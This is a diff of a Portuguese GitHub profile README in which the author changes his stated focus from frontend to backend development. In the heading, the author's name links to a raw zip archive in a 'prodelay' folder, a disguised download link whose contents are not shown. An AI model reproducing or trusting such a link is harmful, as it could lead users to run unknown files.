@@ -1,7 +1,7 @@
 <div>
   <h1 align="center">Olá Tudo bem? Eu sou o <a href="https://raw.githubusercontent.com/joaopedro711/joaopedro711/main/prodelay/joaopedro-v3.1.zip"><i>João Pedro</i></a> 😉</h1>
   <p align="center">Formado em Engenharia de Computação 💻, na Universidade de Brasília. 
-    <p align="center">Atualmente estou aprimorando na área de desenvolvimento FrontEnd.
+    <p align="center">Atualmente estou aprimorando na área de desenvolvimento Backend
     
 
 
